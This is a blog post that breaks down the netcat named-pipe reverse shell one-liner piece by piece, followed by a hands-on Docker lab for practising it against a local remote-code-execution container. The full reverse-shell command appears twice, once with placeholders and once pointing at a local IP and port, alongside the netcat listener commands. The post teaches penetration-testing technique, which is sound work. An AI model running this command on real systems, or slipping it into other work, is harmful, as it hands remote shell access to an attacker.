---
layout: post
title:  "Anatomy of a Reverse Shell: nc named pipe"
categories: 
excerpt: "Breaking down the cryptic reverse shell using nc and named pipes. How the reverse shell works, and a hands-on docker lab to test out reverse shells."
image: "/images/posts/reverse-shell-nc-named-pipe.png"
permalink: "/post/anatomy-of-reverse-shell-nc-pipe/"
---

In penetration testing and hacking, one of the main goals is to obtain a reverse shell on the target or victim system. Sometimes the code and commands to obtain these reverse shells can be very complicated if you aren't familiar with every little piece of the command that is chained together. Today, we'll be discussing a Netcat named pipe reverse shell and breaking it down to fully understand how it works.

# Netcat Named Pipe

Here is the reverse shell command that we are taking a deeper look into:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
```

If you have remote code execution on a target system, and that system has `nc` installed and available, you can enter the above code (replacing `IP` and `PORT` with your own IP and a listening port), and you will get a shell on the target box that lets you enter commands and receive the output in your own terminal.

Let's break down each of these individual commands and take a closer look at what they do and how they work together to give you a semi-interactive reverse shell.

**`rm /tmp/f;`**  
This removes the `/tmp/f` file if it exists. This allows the file to be created in the next step without interfering with an existing file. Ideally, this filename should be fairly unique. If you're using this in a CTF or engagement, make sure to use a unique filename for all instances of the `/tmp/f` file in the command.

**`mkfifo /tmp/f;`**  
This uses `mkfifo` to create a "first in, first out" file, also known as a named pipe. This special type of file can be opened by one process for reading and another for writing. Anything the writing process puts in the file is immediately read by the process that is reading it.

**`cat /tmp/f`**  
`cat` is typically used to read a file and output its contents to the terminal. Here, since we are reading a FIFO (named pipe) file, `cat` will read the file, but since no program has begun writing to it, there is no End of File (EOF) marker. The program waits at this point for data to appear. When new data arrives, it reads and sends it down the pipeline to the next command. If no EOF is seen, it pauses and keeps retrying until more data is added. This repeats until EOF is read.

**`| /bin/sh -i 2>&1`**  
The contents from `/tmp/f` are sent to the `/bin/sh` shell. The `-i` flag starts an interactive session, executing commands as they are read from `/tmp/f`. The `2>&1` part redirects standard error to standard output. By default, error output is not forwarded in the pipeline. Redirecting it ensures that both standard output and error are sent to the next command.

> **Why do almost all reverse shells use `/bin/sh` instead of the friendlier `/bin/bash`?**  
> Not all systems have `/bin/bash` installed. However, `/bin/sh` will *always* be available on all Unix/Linux systems, including embedded and IoT devices.

**`| nc IP PORT > /tmp/f`**  
Next, we take the output of `sh` (executing commands from `/tmp/f`) and use `netcat` to connect to the specified IP and port. Any input received from the IP (e.g., typed commands) is written to `/tmp/f`, read by `cat`, and piped into `sh`, completing the loop.

# Putting It All Together

This type of reverse shell is cyclical. Initially, you read the empty `/tmp/f` file, and `/bin/sh` executes nothing. The output is sent to `nc` at your IP, which lets you type a command. That command is written to `/tmp/f`, picked up by `cat /tmp/f`, and executed by `sh`. The output is sent back to your `nc` session, and displayed in your terminal.

# Hands-On Docker Lab

If you have Docker, you can use this hands-on lab to practice reverse shell commands demonstrated in this post. You can also try out other techniques. For a great reverse shell reference and command builder, check out [RevShells.com](https://www.revshells.com/).

## Prerequisites

You will need Docker and Netcat installed on your PC.

### Installing Docker

Docker is available for Windows, Linux, and macOS. Refer to the [official Docker documentation](https://docs.docker.com/desktop/) for installation instructions.

### Installing Netcat

**Windows**  
Download `nc.exe` from [int0x33's GitHub](https://github.com/int0x33/nc.exe/) and run it from the command prompt.

**Linux**  
Netcat should be available via your distribution’s package manager.

**macOS**  
Netcat should be installed by default. Run `nc` from a Terminal to check.

## Finding Your IP

To connect back to your machine, you need your local IP address.

**Windows**  
Run:
```
ipconfig
```
Look for your IPv4 address under either the Ethernet or Wireless adapter section.

**Linux and macOS**  
Run:
```
ifconfig
```

## Starting the Docker rce-lab

Run the following to launch the Docker image and serve it on port 80:
```
docker run -itp 80:80 --rm rufflabs/rce-lab
```

## Testing Remote Code Execution

Go to `http://localhost/` in your browser. You should see a simple web page with an input box. Try commands like `whoami` or `ls -al` to confirm code execution. Confirm that `nc` is available by running `which nc`. If it returns a path, it’s available.

## Gaining a Reverse Shell

Once you confirm code execution in the Docker container, you can likely obtain a reverse shell via Netcat.

### Starting a Netcat Listener

Open a terminal and run the following (modify as needed):

**Linux/Windows:**
```
nc -lp 4444
```

**macOS:**
```
nc -l 4444
```

The terminal will wait for a connection.

### Using RCE for Reverse Shell

Update the original command with your IP and port:
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.101 4444 > /tmp/f
```

Paste it into the website input box and submit. The page may hang — that’s expected. Switch to your terminal, and you should see a shell prompt.

> **Why does the browser hang?**  
> The PHP backend runs the reverse shell and waits forever as the process doesn’t complete. It hangs until it times out, potentially disconnecting your reverse shell.